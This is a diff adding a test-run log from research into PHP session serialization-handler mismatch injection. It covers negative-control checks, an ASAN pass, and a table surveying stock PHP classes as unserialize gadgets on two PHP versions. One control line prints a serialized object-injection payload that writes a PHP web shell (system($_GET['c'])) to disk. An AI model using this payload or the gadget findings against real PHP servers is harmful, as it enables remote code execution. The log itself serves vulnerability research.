@@ -1,0 +1,93 @@
+==================================================================
+ C1 NEGATIVE CONTROL: php_serialize on BOTH sides, same payload
+==================================================================
+STATUS: HTTP/1.1 200 OK
+[ctrl read.php] handler=php_serialize
+  key='upload_progress_inj|O:14:"DeferredWriter":2:{s:4:"path";s:29:"/tmp/p2s_ap/html/up_shell.php";s:4:"data";s:28:"<?php system($_GET[\'c\']); ?>";}' -> array
+[ctrl read.php] done
+[PASS] C1: no mismatch -> NO injection, no shell (mismatch is the cause)
+
+==================================================================
+ C2: stock php write side - capture the invalid-key warning text
+==================================================================
+STATUS: HTTP/1.1 200 OK
+--- php_error.log ---
+--- error.log session lines ---
+--- session file size: 0 ---
+[note] C2: warning not in logs; wipe itself is the rejection receipt
+
+==================================================================
+ C3: ASAN pass over the mismatch decode (asan2 build)
+==================================================================
+
+Warning: session_start(): Failed to decode session object. Session has been destroyed in /tmp/p2s_asan/r.php on line 8
+array(0) {
+}
+[PASS] C3: ASAN-clean (pure logic bug, no memory corruption involved)
+r.php
+w.php
+
+==================================================================
+ B3: stock-gadget survey (unserialize viability + magic methods)
+==================================================================
+--- system PHP 8.1.2 ---
+class                        unserialize            exact  destruct  wakeup  toString 
+SplFileObject                THROW: Unserializ      no     -         -       Y        
+SplFileInfo                  THROW: Unserializ      no     -         -       Y        
+SplTempFileObject            THROW: Unserializ      no     -         -       Y        
+SplObjectStorage             THROW: Incomplete      no     -         -       -        
+ArrayObject                  THROW: Incomplete      no     -         -       -        
+ArrayIterator                THROW: Incomplete      no     -         -       -        
+SplDoublyLinkedList          THROW: Incomplete      no     -         -       -        
+SplPriorityQueue             SplPriorityQueue       yes    -         -       -        
+SplHeap                      THROW: Cannot ins      no     -         -       -        
+SplFixedArray                SplFixedArray          yes    -         Y       -        
+SplQueue                     THROW: Incomplete      no     -         -       -        
+SplStack                     THROW: Incomplete      no     -         -       -        
+GlobIterator                 THROW: Unserializ      no     -         -       Y        
+DirectoryIterator            THROW: Unserializ      no     -         -       Y        
+FilesystemIterator           THROW: Unserializ      no     -         -       Y        
+RecursiveDirectoryIterator   THROW: Unserializ      no     -         -       Y        
+LimitIterator                LimitIterator          yes    -         -       -        
+RecursiveIteratorIterator    RecursiveIteratorIterator yes    -         -       -        
+Phar                         THROW: Unserializ      no     Y         -       Y        
+PharData                     THROW: Unserializ      no     Y         -       Y        
+PharFileInfo                 THROW: Unserializ      no     Y         -       Y        
+SimpleXMLElement             THROW: Unserializ      no     -         -       Y        
+SimpleXMLIterator            THROW: Unserializ      no     -         -       Y        
+DOMDocument                  THROW: Unserializ      no     -         -       -        
+XMLReader                    XMLReader              yes    -         -       -        
+ReflectionFunction           THROW: Unserializ      no     -         -       Y        
+ReflectionMethod             THROW: Unserializ      no     -         -       Y        
+SessionHandler               SessionHandler         yes    -         -       -        
+--- 8.5.12 plain2 ---
+class                        unserialize            exact  destruct  wakeup  toString 
+SplFileObject                THROW: Unserializ      no     -         -       Y        
+SplFileInfo                  THROW: Unserializ      no     -         -       Y        
+SplTempFileObject            THROW: Unserializ      no     -         -       Y        
+SplObjectStorage             THROW: Incomplete      no     -         -       -        
+ArrayObject                  THROW: Incomplete      no     -         -       -        
+ArrayIterator                THROW: Incomplete      no     -         -       -        
+SplDoublyLinkedList          THROW: Incomplete      no     -         -       -        
+SplPriorityQueue             THROW: Invalid se      no     -         -       -        
+SplHeap                      THROW: Cannot ins      no     -         -       -        
+SplFixedArray                SplFixedArray          yes    -         Y       -        
+SplQueue                     THROW: Incomplete      no     -         -       -        
+SplStack                     THROW: Incomplete      no     -         -       -        
+GlobIterator                 THROW: Unserializ      no     -         -       Y        
+DirectoryIterator            THROW: Unserializ      no     -         -       Y        
+FilesystemIterator           THROW: Unserializ      no     -         -       Y        
+RecursiveDirectoryIterator   THROW: Unserializ      no     -         -       Y        
+LimitIterator                LimitIterator          yes    -         -       -        
+RecursiveIteratorIterator    RecursiveIteratorIterator yes    -         -       -        
+Phar                         __PHP_Incomplete_Class no     -         -       -        
+PharData                     __PHP_Incomplete_Class no     -         -       -        
+PharFileInfo                 __PHP_Incomplete_Class no     -         -       -        
+SimpleXMLElement             THROW: Unserializ      no     -         -       Y        
+SimpleXMLIterator            THROW: Unserializ      no     -         -       Y        
+DOMDocument                  THROW: Unserializ      no     -         Y       -        
+XMLReader                    __PHP_Incomplete_Class no     -         -       -        
+ReflectionFunction           THROW: Unserializ      no     -         -       Y        
+ReflectionMethod             THROW: Unserializ      no     -         -       Y        
+SessionHandler               SessionHandler         yes    -         -       -        
+==================================================================
